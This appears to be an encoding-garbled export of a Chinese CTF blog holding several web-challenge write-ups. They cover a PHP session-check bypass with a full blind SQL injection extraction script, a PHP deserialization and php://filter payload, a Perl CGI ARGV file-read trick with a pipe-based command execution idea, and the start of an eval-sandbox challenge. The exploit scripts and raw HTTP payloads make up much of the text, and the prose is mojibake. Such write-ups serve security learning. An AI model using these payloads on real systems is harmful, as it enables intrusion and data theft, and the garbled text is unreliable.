ä¼¼ä¹å®ƒç”¨çš„UTF-8ï¼Œä¸æ˜¯GBKã€‚å› æ­¤æˆ‘ä»¬éœ€è¦å…¶ä»–çš„ç»•è¿‡æ–¹å¼ã€‚ æˆ‘ä»¬æ³¨æ„åˆ°åœ¨templatesä¸‹çš„PHPæ–‡ä»¶éƒ½æœ‰ä¸€å¥è¯ï¼š!isset($_SESSION) AND die(\"Direct access on this script is not allowed!\");ï¼Œé‚£ä¹ˆè¿™å¥è¯èƒ½å¦ç»•è¿‡ï¼Ÿ \\(\\_SESSIONæ•°ç»„åœ¨session_start()åˆå§‹åŒ–åæ‰äº§ç”Ÿã€‚å› æ­¤æˆ‘ä»¬ç›´æ¥è®¿é—®templatesä¸‹çš„ï¼Œ\\)_SESSIONè¿˜ä¸å­˜åœ¨ã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ å…¥SESSIONå‘¢ï¼Ÿ ğŸŠ åœ¨HITCON 2018çš„æ—¶å€™å‡ºäº†ä¸€é“One line phpï¼Œå…¶ä¸­æ¶‰åŠåˆ°ä¸€ä¸ªPHP SESSIONçš„ç»†èŠ‚ï¼šå¦‚æœåœ¨php.iniä¸­è®¾ç½®session.auto_start=Onï¼Œé‚£ä¹ˆPHPæ¯æ¬¡å¤„ç†PHPæ–‡ä»¶çš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œsession_start()ï¼Œä½†æ˜¯session.auto_starté»˜è®¤ä¸ºOffã€‚ä¸Sessionç›¸å…³çš„å¦ä¸€ä¸ªé€‰é¡¹å«session.upload_progress.enabledï¼Œé»˜è®¤ä¸ºOnï¼Œåœ¨è¿™ä¸ªé€‰é¡¹è¢«æ‰“å¼€çš„å‰æä¸‹æˆ‘ä»¬åœ¨multipart POSTçš„æ—¶å€™ä¼ å…¥PHP_SESSION_UPLOAD_PROGRESSï¼ŒPHPä¼šæ‰§è¡Œsession_start()ï¼ˆå…·ä½“è¯·å‚è€ƒè¿™é‡Œï¼‰ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬ä¼ å…¥multipartçš„POSTåŒ…è¯•è¯•çœ‹ã€‚è¿™ä¸ªå¾ˆç®€å•ï¼Œç”¨requestsé…åˆfileså‚æ•°å°±å¯ä»¥äº†ã€‚ 123456789import requestsurl = &quot;http://192.168.1.2:6385/templates/login.php&quot;files = &#123;&quot;file&quot;: &quot;123456789&quot;&#125;a = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;, cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;, params=&#123;&#x27;username&#x27;: &#x27;test&#x27;, &#x27;password&#x27;: &#x27;test&#x27;&#125;, proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;)print(a.text) æ•°æ®åŒ…é•¿è¿™æ ·ï¼š 1234567891011121314151617181920POST /templates/login.php?username=test&amp;password=test HTTP/1.1Host: 192.168.1.2:6385User-Agent: python-requests/2.20.1Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: PHPSESSID=test1Content-Length: 266Content-Type: multipart/form-data; boundary=5c2bfb7c7c0c48ed9345b1babff33109--5c2bfb7c7c0c48ed9345b1babff33109Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;123456789--5c2bfb7c7c0c48ed9345b1babff33109Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file&quot;123456789--5c2bfb7c7c0c48ed9345b1babff33109-- è¿”å›Try againï¼Œæ„å‘³ç€æˆ‘ä»¬æˆåŠŸçš„ç»•è¿‡Sessionæ£€æµ‹ï¼Œå¯ä»¥SQLæ³¨å…¥äº†ã€‚è¿™ä¸ªSQLæ³¨å…¥æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ³¨å°±å¯ä»¥äº†ã€‚æ³¨æ„ä»–æ²¡æœ‰å›æ˜¾ï¼Œè¦ç›²æ³¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import requestsurl = &quot;http://192.168.1.2:6385/templates/login.php&quot;files = &#123;&quot;file&quot;: &quot;123456789&quot;&#125;# get database name# result = &quot;&quot;# for b in range(1, 64):# for a in range(10, 200):# param = &#123;&#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(b, a),# &#x27;password&#x27;: &#x27;test&#x27;&#125;## c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,# cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,# params=param,# #proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;# )# # print(c.text)# if &quot;again&quot; not in c.text:# result += chr(a)# print(c.text)# print(result)# get table name,we got flag_tbl and ptbctf by changing limit# result = &quot;&quot;# for b in range(1, 64):# for a in range(10, 200):# param = &#123;# &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(# b, a),# &#x27;password&#x27;: &#x27;test&#x27;&#125;## c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,# cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,# params=param,# # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;# )# # print(c.text)# if &quot;again&quot; not in c.text:# result += chr(a)# print(c.text)# print(result)# get column name of flag_tbl,we got secret# result = &quot;&quot;# for b in range(1, 64):# for a in range(10, 200):# param = &#123;# &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select column_name from information_schema.columns where table_name=&quot;flag_tbl&quot; limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(# b, a),# &#x27;password&#x27;: &#x27;test&#x27;&#125;## c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,# cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,# params=param,# # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;# )# # print(c.text)# if &quot;again&quot; not in c.text:# result += chr(a)# print(c.text)# print(result)# get column name of flag_tbl,we got secretresult = &quot;&quot;for b in range(1, 64): for a in range(10, 200): param = &#123; &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select secret from flag_tbl),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format( b, a), &#x27;password&#x27;: &#x27;test&#x27;&#125; c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;, cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;, params=param, # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125; ) # print(c.text) if &quot;again&quot; not in c.text: result += chr(a) print(c.text) print(result) flag{03147e79-2ad9-45cf-9c25-c77289f18346}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"ç›²æ³¨","slug":"ç›²æ³¨","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"},{"name":"addslashes","slug":"addslashes","permalink":"http://tiaonmmn.github.io/tags/addslashes/"},{"name":"PHP_SESSION_UPLOAD_PROGRESS","slug":"PHP-SESSION-UPLOAD-PROGRESS","permalink":"http://tiaonmmn.github.io/tags/PHP-SESSION-UPLOAD-PROGRESS/"}]},{"title":"BUUOJåˆ·é¢˜-Web-NiZhuanSiWei","slug":"BUUOJåˆ·é¢˜-Web-NiZhuanSiWei","date":"2019-10-07T07:31:48.000Z","updated":"2019-12-10T12:15:12.601Z","comments":true,"path":"2019/10/07/BUUOJåˆ·é¢˜-Web-NiZhuanSiWei/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/07/BUUOJ%E5%88%B7%E9%A2%98-Web-NiZhuanSiWei/","excerpt":"æœ‰ç‚¹è€çš„é¢˜äº†ã€‚ æ‰“å¼€å°±ç»™æºç ï¼Œç„¶åæ‰«ç›®å½•å‘ç°æœ‰flag.phpï¼Œè®¿é—®æ²¡å†…å®¹ï¼š","text":"æœ‰ç‚¹è€çš„é¢˜äº†ã€‚ æ‰“å¼€å°±ç»™æºç ï¼Œç„¶åæ‰«ç›®å½•å‘ç°æœ‰flag.phpï¼Œè®¿é—®æ²¡å†…å®¹ï¼š 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; ç¬¬ä¸€ä¸ªifè¦æ±‚file_get_contentsè¯»\\(textï¼Œå†…å®¹ä¸ºwelcome to the zjctfï¼Œè¿™ä¸ªç”¨php://inputï¼Œç„¶åPOSTä¼ welcome to the zjctfå°±å¯ä»¥äº†ã€‚ç„¶åç¬¬äºŒä¸ªifè¦æ±‚ä¸èƒ½å‡ºç°ä»»ä½•å¸¦æœ‰flagçš„å­—æ ·çš„å­—ç¬¦ä¸²ï¼Œç»•ä¸è¿‡ã€‚ç„¶åinclude(\\)file)ï¼ŒåŒæ—¶æç¤ºuseless.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨PHPä¼ªåè®®è¯»useless.phpï¼Œphp://filter/convert.base64-encode/resource=useless.phpã€‚å¾—åˆ°useless.phpå¦‚ä¸‹ï¼š 1234567891011&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; å¾ˆç®€å•çš„Flagç±»ï¼Œç»™\\(fileèµ‹å€¼ï¼Œä¼šfile_get_contents(\\)file)ï¼Œç›´æ¥æ‰“å°±å¯ä»¥äº†ã€‚ 123456789101112131415161718&lt;?phpclass Flag&#123; //flag.php public $file=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;; public function __tostring() &#123; if (isset($this-&gt;file)) &#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125;&#125;$a=new Flag();print(serialize($a)); æ‰€ä»¥ï¼Œæœ€ç»ˆçš„Payloadä¸ºï¼š 123456789101112131415POST /?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125; HTTP/1.1Host: 41171917-0950-4ee1-b7d0-f4ba9e0e7242.node2.buuoj.cn.wetolink.com:82Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Connection: closeContent-Length: 20welcome to the zjctf flag{02e8a6f0-ddaa-4414-a807-aa01eeae999b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"å¸¸ç”¨é…ç½®æ–‡ä»¶åœ°å€","slug":"å¸¸ç”¨é…ç½®æ–‡ä»¶åœ°å€","date":"2019-10-06T14:41:24.000Z","updated":"2019-12-10T12:15:12.677Z","comments":true,"path":"2019/10/06/å¸¸ç”¨é…ç½®æ–‡ä»¶åœ°å€/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/06/%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%9C%B0%E5%9D%80/","excerpt":"","text":"è®°ä¸€ä¸‹å¸¸è§çš„é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ï¼ˆé»˜è®¤é…ç½®ï¼‰ï¼š Alpine Linux Dockerçš„Apache2é…ç½®æ–‡ä»¶ï¼š/etc/apache2/httpd.confï¼ˆä¸»é…ç½®æ–‡ä»¶ï¼‰ï¼Œå…¶ä½™æ–‡ä»¶åœ¨/etc/apache2ç›®å½•ä¸‹ OpenRestyç¯å¢ƒä¸‹çš„Nginxé…ç½®æ–‡ä»¶ï¼š/usr/local/openresty/nginx/conf/nginx.conf Nginxçš„é…ç½®æ–‡ä»¶ï¼š/usr/local/nginx/conf/nginx.confï¼ˆé¢˜ç›®å‡ºç°è¿‡ï¼Œä½†æˆ‘ä¸çŸ¥é“ä»€ä¹ˆæ ·çš„ç³»ç»Ÿç¯å¢ƒï¼‰ flag{270eae65-4c94-46e0-a891-b80828933c8c}","categories":[{"name":"Logs","slug":"Logs","permalink":"http://tiaonmmn.github.io/categories/Logs/"}],"tags":[{"name":"Configuration","slug":"Configuration","permalink":"http://tiaonmmn.github.io/tags/Configuration/"}]},{"title":"CSAW2016 Web I Got ID","slug":"CSAW2016-Web-I-Got-ID","date":"2019-10-06T11:38:57.000Z","updated":"2019-12-10T12:15:12.608Z","comments":true,"path":"2019/10/06/CSAW2016-Web-I-Got-ID/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/06/CSAW2016-Web-I-Got-ID/","excerpt":"CSAW 2016 Qualification CTFçš„I Got IDã€‚Perlçš„é¢˜ã€‚ æ‰“å¼€é¡µé¢ï¼Œæœ‰ä¸‰ä¸ªé“¾æ¥ï¼Œ.plç»“å°¾ï¼Œå¯èƒ½æ˜¯Perlè„šæœ¬ï¼ŒCGIï¼Ÿç‚¹å¼€ä»¥åhello.plåªæœ‰ä¾æ®æç¤ºï¼Œæ²¡æœ‰ä½œç”¨ã€‚è€Œforms.plå…è®¸æˆ‘ä»¬è¾“å…¥Nameä¸Ageã€‚ç„¶åå°±åŸæ ·è¾“å‡ºäº†ã€‚é‡ç‚¹æ˜¯file.plï¼Œå…è®¸æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åä»–ä¼šå†è¯»å–ï¼Œæ˜¾ç¤ºåˆ°å½“å‰é¡µé¢ã€‚ ç„¶åå¦‚æœæˆ‘ä»¬ç”¨Acunetixï¼Œå…¶å®å°±èƒ½æ‰«å‡ºæ¥æ¼æ´äº†ã€‚æ‰«ææŠ¥å‘Šå¦‚ä¸‹ï¼š","text":"CSAW 2016 Qualification CTFçš„I Got IDã€‚Perlçš„é¢˜ã€‚ æ‰“å¼€é¡µé¢ï¼Œæœ‰ä¸‰ä¸ªé“¾æ¥ï¼Œ.plç»“å°¾ï¼Œå¯èƒ½æ˜¯Perlè„šæœ¬ï¼ŒCGIï¼Ÿç‚¹å¼€ä»¥åhello.plåªæœ‰ä¾æ®æç¤ºï¼Œæ²¡æœ‰ä½œç”¨ã€‚è€Œforms.plå…è®¸æˆ‘ä»¬è¾“å…¥Nameä¸Ageã€‚ç„¶åå°±åŸæ ·è¾“å‡ºäº†ã€‚é‡ç‚¹æ˜¯file.plï¼Œå…è®¸æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åä»–ä¼šå†è¯»å–ï¼Œæ˜¾ç¤ºåˆ°å½“å‰é¡µé¢ã€‚ ç„¶åå¦‚æœæˆ‘ä»¬ç”¨Acunetixï¼Œå…¶å®å°±èƒ½æ‰«å‡ºæ¥æ¼æ´äº†ã€‚æ‰«ææŠ¥å‘Šå¦‚ä¸‹ï¼š å…¶ä¸­æœ‰ä¸€æ¡Directory traversalï¼Œæ ¹æ®æ‰€ç»™çš„Payloadæˆ‘ä»¬å¯ä»¥å¾—åˆ°/etc/passwdçš„å†…å®¹ã€‚ç„¶åç›²çŒœflagåœ¨æ ¹ç›®å½•ï¼Œæˆ‘ä»¬ç›´æ¥è¯»/flagå°±èƒ½å¾—åˆ°flagçš„å†…å®¹ã€‚ é‚£ä¹ˆï¼Œé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆè¿™æ ·å°±èƒ½å¾—åˆ°flagå‘¢ï¼Ÿæˆ‘ä»¬æ³¨æ„åˆ°POSTçš„æ•°æ®åŒ…ä¸­åˆä¼ é€’äº†å¥‡æ€ªçš„fileï¼Œå†…å®¹ä¸ºARGVã€‚å…·ä½“åŸå› æˆ‘ä»¬è¿˜æ˜¯ç¿»æºç å§ã€‚ æ ¹æ®åˆšæ‰çš„Payloadæˆ‘ä»¬æ¥å°è¯•è¯»ä¸€ä¸‹æºç ï¼Œ/var/www/htmlæ²¡æœ‰ååº”ï¼Œæˆ‘ä»¬è¯»ä¸€ä¸‹/etc/apache2/httpd.confï¼Œè¿™ä¸ªæ˜¯Alpine Linuxçš„Apache2é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ï¼Œä»ä¸­æˆ‘ä»¬å¾—åˆ°cgi-binåœ¨/var/www/localhost/ä¸‹ï¼Œç„¶åæˆ‘ä»¬è¯»file.plï¼Œå¾—åˆ°ä¸‹é¢å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930 #!/usr/bin/perluse strict;use warnings; use CGI;my $cgi = CGI-&gt;new;print $cgi-&gt;header;print &lt;&lt; &quot;EndOfHTML&quot;;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; lang=&quot;en-US&quot; xml:lang=&quot;en-US&quot;&gt; &lt;head&gt; &lt;title&gt;Perl File Upload&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Perl File Upload&lt;/h1&gt; &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; File:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Submit!&quot; value=&quot;Submit!&quot; /&gt; &lt;/form&gt; &lt;hr /&gt;EndOfHTMLif ($cgi-&gt;upload(&#x27;file&#x27;)) &#123; my $file = $cgi-&gt;param(&#x27;file&#x27;); while (&lt;$file&gt;) &#123; print &quot;$_&quot;; print &quot;&quot;; &#125;&#125;print &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;; é¦–å…ˆçœ‹ä¸€ä¸‹ç¬¬23è¡Œï¼Œmy $file= $cgi-&gt;param( 'file' )ï¼Œè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼ŒPerlçš„CGIæ¨¡å—æœ‰param()æ–¹æ³•ï¼Œç”¨æ¥æ¥æ”¶æˆ‘ä»¬ä¼ é€’çš„å‚æ•°ï¼ˆPOST/GETå‡å¯ï¼‰ï¼Œå‚è€ƒè¿™ä¸ªï¼Œé‡ç‚¹æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯é‡å¤çš„ï¼Œä¾‹å¦‚ä¼ å…¥/?a=1&amp;a=2ï¼Œé‚£ä¹ˆparam('a')é»˜è®¤æƒ…å†µä¸‹ä¼šåªè¿”å›ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸Šä¾‹ä¸­param('a')è¿”å›1ï¼ˆé™¤éç”¨scalaré™å®šè¿”å›çš„æ˜¯æ•°ç»„ï¼Œæˆ–è€…ç”¨multi_param()æ–¹æ³•ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™åœ¨æ­£å¸¸çš„æ–‡ä»¶æ•°æ®å‰æ’å…¥ä¸€ä¸ªname=\"file\"çš„éƒ¨åˆ†ï¼Œå®é™…ä¸Š\\(fileå°±ä¼šå˜æˆæˆ‘ä»¬æ’å…¥çš„å†…å®¹ã€‚\\)fileå¯æ§ã€‚ ä¸‹ä¸€ä¸ªé‡ç‚¹æ˜¯ç¬¬24è¡Œï¼šwhile (&lt;$file&gt;) &#123;ï¼ŒPerlä¸­&lt;&gt;ä»£è¡¨è¾“å…¥è¾“å‡ºå¥æŸ„ï¼Œå…·ä½“å‚è€ƒè¿™é‡Œçš„I/O Operatorsä¸€èŠ‚ä¸è¿™é‡Œï¼Œç®€å•æ¥è¯´ï¼Œ&lt;abc&gt;ï¼Œä»£è¡¨æ‰“å¼€äº†ä¸€ä¸ªå«åšabcçš„æ–‡ä»¶ï¼Œå®ƒç›¸å½“äºreadline(open(abc))ï¼Œreadlineçš„è¯´æ˜è¯·å‚è€ƒè¿™é‡Œã€‚&lt;&gt;ä¸­çš„å†…å®¹æ˜¯ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œæˆ‘ä»¬ç›´æ¥ä¼ å…¥å­—ç¬¦ä¸²æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œä½†æœ‰å‡ ä¸ªé¢„ç½®å˜é‡é™¤å¤–ï¼šSTDINã€STDOUTã€STDERRä¸ARGVï¼Œæˆ‘ä»¬ä¼ å…¥ARGVå°±ä¼šè®©whileå¾ªç¯å¤„ç†ARGVæ•°ç»„ï¼Œè€ŒARGVæ˜¯ä»€ä¹ˆï¼Ÿå‚è€ƒè¿™ä¸ªã€è¿™ä¸ªä¸è¿™ä¸ªï¼Œç®€å•æ¥è¯´å°±æ˜¯Perlè„šæœ¬è¿è¡Œçš„æ—¶å€™ä¼ å…¥çš„å‚æ•°ï¼Œåœ¨CGIä¸‹è¿˜åŒ…å«ä¼ é€’çš„GETå‚æ•°ã€‚å› æ­¤æˆ‘ä»¬å¦‚æœè®¿é—®file.pl?/etc/passwdï¼ŒARGVå°±ä¼šå˜æˆ['/etc/passwd']ï¼Œä»è€Œæ‰“å¼€/etc/passwdå¹¶æ˜¾ç¤ºå†…å®¹ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬æäº¤file.pl?/flagå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚ è¿˜æœ‰æ²¡æœ‰åˆ«çš„æ–¹æ³•å‘¢ï¼Ÿæˆ‘ä»¬åˆšæ‰å¾—åˆ°flagæ˜¯åŸºäºæˆ‘ä»¬çŒœåˆ°äº†flagä½äºæ ¹ç›®å½•ï¼Œå¦‚æœä¸æ˜¯å‘¢ï¼Ÿæˆ‘ä»¬èƒ½å¦é€šè¿‡Perlè¿›è¡ŒRCEï¼Ÿ ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼ŒPerlåœ¨å¤„ç†&lt;&gt;çš„æ—¶å€™ä¼šé»˜è®¤è°ƒç”¨open()æ–¹æ³•ï¼Œè€Œopen()æ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå…·ä½“å‚è€ƒè¿™ä¸ªï¼Œæˆ‘ä»¬åœ¨ä¼ å…¥æ–‡ä»¶åçš„æ—¶å€™åé¢åŠ ä¸€ä¸ª|å°±å¯ä»¥äº†ã€‚Payloadå¦‚ä¸‹ï¼š æ³¨æ„åœ¨|å‰é¢è¦æœ‰ç©ºæ ¼ã€‚ å…³äºPerl CGIçš„å…¶ä»–ç¼ºç‚¹å¯å‚è€ƒä¸‹é¢çš„Gistã€‚ flag{41ff23eb-30f9-4fec-aca2-f53a739f0fe2}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Perl","slug":"Perl","permalink":"http://tiaonmmn.github.io/tags/Perl/"},{"name":"CGI","slug":"CGI","permalink":"http://tiaonmmn.github.io/tags/CGI/"},{"name":"Acunetix","slug":"Acunetix","permalink":"http://tiaonmmn.github.io/tags/Acunetix/"}]},{"title":"BUUOJåˆ·é¢˜-Web-nextphp","slug":"BUUOJåˆ·é¢˜-Web-nextphp","date":"2019-10-04T11:06:04.000Z","updated":"2019-12-10T12:15:12.600Z","comments":true,"path":"2019/10/04/BUUOJåˆ·é¢˜-Web-nextphp/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/","excerpt":"RCTF 2019çš„nextphpã€‚ å¼€å±€ä¸€ä¸ªevalï¼Œå‰©ä¸‹å…¨é ç¼–ã€‚","text":"RCTF 2019çš„nextphpã€‚ å¼€å±€ä¸€ä¸ªevalï¼Œå‰©ä¸‹å…¨é ç¼–ã€‚ 123456&lt;?phpif (isset($_GET[&#x27;a&#x27;])) &#123; eval($_GET[&#x27;a&#x27;]);&#125; else &#123; show_source(__FILE__);&#125; æƒ³å½“ç„¶åœ°å…ˆè¯•ä¸€ä¸‹systemï¼Œä¸å‡ºæ‰€æ–™çš„è¢«disableäº†ï¼Œé‚£ä¹ˆçœ‹ä¸€ä¸‹phpinfoå§ã€‚PHP 7.4.0-devï¼Œç‰¹åˆ«æ–°çš„ç‰ˆæœ¬ã€‚é¢å¤–åŠ è½½äº†/usr/local/etc/php/conf.d/php-nextphp.iniï¼ŒReflectionClassè¢«Banï¼Œä¸€å¤§å †å‡½æ•°ä¹Ÿè¢«Banäº†ï¼šset_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dlã€‚å¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡Œå‘½ä»¤çš„å‡½æ•°å…¨Banï¼Œmailä¹ŸBanäº†ï¼Œè®¾ç½®äº†open_basedirä¸º/var/www/htmlã€‚ ç›®å‰æˆ‘ä»¬å¯ä»¥è¯»æ–‡ä»¶å†…å®¹ä¸åˆ—ç›®å½•ã€‚/?a=print_r(scandir(\".\"));ï¼Œå‘ç°æœ‰preload.phpï¼Œæˆ‘ä»¬è¯»ä¸€ä¸‹å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfinal class A implements Serializable &#123; protected $data = [ &#x27;ret&#x27; =&gt; null, &#x27;func&#x27; =&gt; &#x27;print_r&#x27;, &#x27;arg&#x27; =&gt; &#x27;1&#x27; ]; private function run () &#123; $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception(&#x27;No implemented&#x27;); &#125; public function __construct () &#123; throw new \\Exception(&#x27;No implemented&#x27;); &#125;&#125; æˆ‘ä»¬å¯ä»¥åœ¨index.phpä¸­unserializeä¸€ä¸ªç±»ï¼Œä½†æ˜¯æˆ‘ä»¬ç›®å‰å¹¶ä¸çŸ¥é“preload.phpçš„ç±»ä¸index.phpæœ‰ä»€ä¹ˆè”ç³»ã€‚ è¿™æ—¶å°±è¦é—®ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆè¦ç”¨PHP 7.4ï¼Ÿæˆ‘ä»¬æŸ¥ä¸€ä¸‹PHP 7.4çš„æ–°ç‰¹æ€§ï¼Œå‘ç°æœ‰å‡ ä¸ªå¾ˆæœ‰è¶£ï¼šPreloadingå’ŒNew Custom Object Serialization 